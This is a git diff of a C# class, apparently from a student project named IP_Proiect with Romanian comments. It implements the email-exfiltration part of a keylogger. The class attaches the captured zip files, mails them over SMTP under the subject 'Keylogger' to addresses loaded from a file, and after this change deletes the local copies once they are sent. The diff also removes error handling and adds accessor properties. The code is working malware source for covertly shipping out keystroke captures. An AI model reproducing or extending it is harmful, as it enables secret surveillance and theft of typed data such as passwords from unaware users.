@@ -21,6 +21,7 @@ using System.Threading.Tasks;
 using System.Net;
 using System.Net.Mail;
 using System.IO;
+
 namespace IP_Proiect
 {
     /// <summary>
@@ -38,6 +39,7 @@ namespace IP_Proiect
         private SmtpClient _smtp;
         private MailMessage _mailMessage;
         private List<string> _fileNames;
+        public string MessageBody { get; set; }
 
         private EmailSender()
         {
@@ -54,7 +56,10 @@ namespace IP_Proiect
             _smtp.Credentials = new NetworkCredential(_address, _password);
             _smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
         }
-
+        public List<string> EmailList
+        {
+            get { return _emails; }
+        }
         public static EmailSender Instance
         { get { if (_instance == null)
                 {
@@ -85,7 +90,6 @@ namespace IP_Proiect
         /// <param name="data">Fisierul zip ce trebuie trimis</param>
         public void PutArray(byte[] data)
         {
-
             string name = "file" + _fileNames.Count + ".zip";
             if (!Directory.Exists(_filesPath))
             {
@@ -99,36 +103,23 @@ namespace IP_Proiect
         /// </summary>
         public void Send()
         {
-            try
+            _mailMessage = new MailMessage();
+            _mailMessage.From = new MailAddress(_address);
+            _mailMessage.Attachments.Clear();
+            foreach (string fileName in _fileNames)
             {
-                _mailMessage = new MailMessage();
-                _mailMessage.From = new MailAddress(_address);
-                foreach (string fileName in _fileNames)
-                {
-                    _mailMessage.Attachments.Add(new Attachment(_filesPath + fileName));
-                }
-                foreach (string email in _emails)
-                {
-                    _mailMessage.To.Add(new MailAddress(email));
-                }
-                _mailMessage.Subject = "Keylogger";
-                _mailMessage.Body = "zip files bellow";
-                _smtp.Send(_mailMessage);
-
-
-                Console.Out.WriteLine("Am trimis mesajul Catre:");
-                foreach (string email in _emails)
-                {
-                    Console.Out.WriteLine(email);
-                }
+                _mailMessage.Attachments.Add(new Attachment(_filesPath + fileName));
             }
-            catch (SmtpException smtpException)
+            foreach (string email in _emails)
             {
-                Console.Out.WriteLine("Eroare de trimitere\n" + smtpException.Message);
+                _mailMessage.To.Add(new MailAddress(email));
             }
-            catch (Exception exception)
+            _mailMessage.Subject = "Keylogger";
+            _mailMessage.Body = "zip files bellow";
+            _smtp.Send(_mailMessage);
+            foreach (string fileName in _fileNames)
             {
-                Console.Out.WriteLine("Eroare la trimitere\n" + exception.Message);
+                File.Delete(fileName);
             }
         }
         /// <summary>
@@ -136,15 +127,8 @@ namespace IP_Proiect
         /// </summary>
         /// <param name="index">pozitia in lista</param>
         public void DeleteEmail(int index)
-        {
-            try
-            {
-                _emails.RemoveAt(index);
-            }
-            catch(IndexOutOfRangeException indexException)
-            {
-                Console.Out.WriteLine("Index incorect" + indexException.Message);
-            }
+        { 
+            _emails.RemoveAt(index);
         }
         /// <summary>
         /// Scriu lista de email-uri intr-un fisier
@@ -163,20 +147,14 @@ namespace IP_Proiect
         /// </summary>
         public void LoadEmails()
         {
-            try
+            string []emails=File.ReadAllLines(_emailsFile);
+            _emails.Clear();
+            foreach (string email in emails)
             {
-                string []emails=File.ReadAllLines(_emailsFile);
-                _emails.Clear();
-                foreach (string email in emails)
-                {
-                    _emails.Add(email);
-                }
-            }
-            catch (FileNotFoundException fileNotFound)
-            {
-                Console.Out.WriteLine("Nu gasesc fisierul cu emailuri\n"+fileNotFound.Message);
-            }
+                _emails.Add(email);
+            }  
         }
+        
     }
     
 }
